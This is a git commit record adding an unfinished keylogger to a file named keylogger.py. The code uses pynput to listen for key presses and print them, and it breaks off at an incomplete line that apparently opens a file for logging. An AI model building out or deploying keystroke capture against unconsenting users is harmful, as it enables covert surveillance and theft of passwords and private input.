8d810b1ebea7b22dead027d0c159205ba4c76b1b
Silver595 <akashpurjalkar66@gmail.com>
2025-06-11 17:37:25 +0530

    taking break

--- keylogger.py
+++ keylogger.py
@@ -1,3 +1,10 @@
 from pynput import keyboard
 
+def keyPressed(key):
+    print(str(key))
+    with open
+
 if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed) # type: ignore
+    listener.start()
+    input()
